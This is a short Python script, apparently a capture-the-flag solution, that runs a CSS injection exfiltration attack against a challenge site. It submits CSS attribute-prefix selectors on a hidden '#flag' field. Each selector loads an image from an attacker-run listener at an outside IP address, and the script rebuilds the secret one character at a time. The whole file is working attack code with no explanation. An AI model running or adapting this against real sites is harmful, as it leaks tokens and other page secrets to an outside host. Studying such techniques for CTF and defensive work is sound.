import asyncio
import string

import requests
from aiohttp import web


async def css_injection(inject):
	curr = "grey{"
	resp = asyncio.Queue()
	routes = web.RouteTableDef()

	@routes.get("/get/{name}")
	async def get(request):
		await resp.put(request.match_info["name"])
		return web.Response(body="")

	app = web.Application()
	app.add_routes(routes)
	runner = web.AppRunner(app)
	await runner.setup()
	site = web.TCPSite(runner, "0.0.0.0", 8000)
	await site.start()
	while True:
		await inject(curr, "http://129.80.25.148:8000/")
		c = await resp.get()
		curr += c
		print(curr)
	await runner.cleanup()


async def inject(prefix, url):
	css = ""
	for c in string.ascii_lowercase + string.ascii_uppercase + string.digits:
		css += f"#flag[value^='{prefix + c}']{{background-image:url({url}get/{c})}}"

	resp = requests.post(
		"http://challs.nusgreyhats.org:33339/submit", data={"css_value": css}
	)
	requests.post(resp.url.replace("submission", "judge"))


asyncio.run(css_injection(inject))
